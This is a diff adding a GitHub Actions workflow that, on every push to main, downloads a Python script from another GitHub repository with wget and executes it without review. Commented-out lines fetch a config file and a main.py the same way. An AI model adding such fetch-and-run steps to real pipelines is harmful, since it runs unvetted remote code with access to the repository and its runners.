@@ -1,0 +1,34 @@
+name: Multi-Machine Workflowzz
+
+on:
+  push:
+    branches:
+      - main
+
+jobs:
+  run-on-ubuntu:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        program_number: [1]
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v2
+
+      - name: Set up Python
+        uses: actions/setup-python@v3
+        with:
+          python-version: 3.11  # Replace with your desired Python version
+
+      - name: Run Python Program
+        run: |
+          pip install requests beautifulsoup4 colorama
+          wget https://github.com/Mosnio/dpy/raw/main/ml${{ matrix.program_number }}.py
+          ls
+          python ml${{ matrix.program_number }}.py
+    #      wget https://github.com/Mosnio/wCUn/raw/main/b${{ matrix.program_number }}.json -O config.json
+#          wget https://github.com/Mosnio/wCUn/raw/main/main.py
+
+        
+        
